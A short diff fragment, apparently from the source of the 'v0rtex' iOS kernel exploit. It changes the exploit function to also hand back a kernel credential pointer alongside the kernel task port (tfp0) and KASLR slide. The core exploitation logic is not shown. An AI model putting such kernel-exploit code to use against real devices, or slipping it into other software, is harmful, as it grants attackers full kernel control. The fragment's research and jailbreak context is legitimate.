@@ -431,10 +431,10 @@ typedef union
     } b;
 } ktask_t;
 
-//kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide, kptr_t *kernucred, kptr_t *selfproc)
-kern_return_t v0rtex(task_t *tfp0, uint64_t *kslide) {
-    kern_return_t retval = KERN_FAILURE,
-    ret;
+//kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide, kptr_t *kernucred, kptr_t *selfproc) {
+//kern_return_t v0rtex(task_t *tfp0, uint64_t *kslide) {
+kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide, kptr_t *kernucred) {
+    kern_return_t retval = KERN_FAILURE, ret;
     task_t self = mach_task_self();
     host_t host = mach_host_self();
     
@@ -1215,9 +1215,12 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
     
     *tfp0 = kernel_task;
     *kslide = slide;
-//    *kernucred = kern_ucred;
+    *kernucred = kern_ucred;
 //    *selfproc = self_proc;
+    
     retval = KERN_SUCCESS;
+    
+    
     
 out5:;
     _kernelrpc_mach_port_destroy_trap(self, maps[0]);
